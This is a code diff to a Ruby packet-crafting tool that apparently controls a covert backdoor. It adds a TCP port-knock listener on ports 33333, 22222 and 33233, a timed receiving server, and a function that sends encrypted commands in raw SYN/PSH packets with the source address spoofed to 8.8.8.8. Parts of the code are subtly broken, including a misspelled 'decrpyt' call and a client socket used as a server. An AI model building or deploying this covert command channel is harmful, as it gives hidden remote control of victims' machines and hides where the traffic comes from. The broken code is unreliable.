@@ -89,7 +89,14 @@ def listen_for_knock
           end
         elsif PacketFu::TCPPacket.can_parse?(p)
           #TCP
-          #puts "tcp: #{pkt.tcp_dst}"
+          if pkt.tcp_dst == 33333
+            k1 = true
+          elsif pkt.tcp_dst == 22222
+            k2 = true
+            config = decrypt(pkt.payload)
+          elsif pkt.tcp_dst == 33233
+            k3 = true
+          end
         else
           #not implemented: other protocol sniffing
         end
@@ -136,8 +143,20 @@ def start_receiving_server(config)
       puts "recv server ending (udp)"
     }
   elsif cfg_items[0] == TCP
-    #coming
-    puts TCP
+    recv_thread = Thread.new {
+      puts "recv server started (tcp)"
+      socket = TCPSocket.new('0.0.0.0', cfg_items[1].to_i)
+      max_time = cfg_items[2].to_i
+      timer = Thread.new {sleep max_time}
+      loop {
+        if timer.status == false #ttl has completed
+          break
+        end
+        #check size for recv
+        payload += decrpyt(socket.gets)
+      }
+      puts "recv server ending (tcp)"
+    }
   else
     #not implemented: other protocol receiving servers
   end
@@ -167,15 +186,15 @@ end
 # @param [String] command
 # - command to wrap in payload
 def send_pkt_server_async(command)
-  if $cfg_pen_protocol == TCP
-    # handle TCP here
-  elsif $cfg_pen_protocol == UDP
-    payload = "#{AUTH_STRING} #{command}"
-    if payload.match(PAYLOAD_REGEX)
+  payload = "#{AUTH_STRING} #{command}"
+  if payload.match(PAYLOAD_REGEX)
+    if $cfg_pen_protocol == TCP
+      tcp_packet(payload)
+    elsif $cfg_pen_protocol == UDP
       udp_packet(payload)
-    else
-      exit_reason("Error with payload validation")
     end
+  else
+    exit_reason("Error with payload validation")
   end
 end
 
@@ -201,6 +220,32 @@ def udp_packet(payload)
   udp_pkt.to_w($cfg_iface)
 
   puts "udp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
+end
+
+# Crafts TCP packet aimed to the values from the configuration file
+# dst port = pen_port
+# ip_daddr = target_ip
+# src_port and ip_saddr are not important so they can be spoofed.
+# Packet is then placed on the configured interface.
+# @params [String] payload
+# - data to send in the TCP packet
+def tcp_packet(payload)
+  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
+  tcp_pkt = PacketFu::TCPPacket.new(:config => config, :flavor => "Linux")
+
+  tcp_pkt.ip_daddr = $cfg_target_ip
+  tcp_pkt.tcp_dst = $cfg_pen_port
+  tcp_pkt.tcp_src = rand(0xffff)
+  tcp_pkt.ip_saddr = "8.8.8.8"
+
+  tcp_pkt.tcp_flags.psh = 1
+  tcp_pkt.tcp_flags.syn = 1
+  tcp_pkt.payload = encrypt(payload)
+
+  tcp_pkt.recalc
+  tcp_pkt.to_w($cfg_iface)
+
+  puts "tcp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
 end
 
 ## Main
